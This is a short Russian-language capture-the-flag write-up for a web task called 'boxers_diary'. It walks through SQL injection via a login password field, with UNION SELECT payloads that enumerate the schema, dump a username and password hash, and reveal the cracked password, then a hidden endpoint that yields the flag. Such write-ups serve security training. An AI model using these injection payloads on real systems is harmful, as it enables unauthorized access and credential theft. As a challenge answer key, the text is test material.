
# Решение | boxers_diary | Medium | Web

В форме регистрации написано не больше 25 символов - давайте в пароле сделаем больше

в Login форме в пароле пишем: (важно использовать два %%)

1) 12345678901231111234567890123111' UNION SELECT concat(table_name) FROM information_schema.tables WHERE table_name like '%%users%%' --  //получили таблицу
2) 12345678901231111234567890123111' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users' AND column_name like '%%user%%'--//можем посмотреть колонки
3) 12345678901231111234567890123111' UNION SELECT username FROM users -- ////////Alex - пользователь
4) 12345678901231111234567890123111' UNION SELECT password FROM users -- ///////b71136604cdf2dd0ad05d130492af6a0 - хэш для пароля - легко сломать - пароль = SuperSecret!
5) переходим на страницу пользователя и видм вкладку 'Удалить боксера' - если посмотреть комментарии к js можно заметить ручку /serverinf0 отправляем get запрос - ничего не получаем, отправляем post - получаем флаг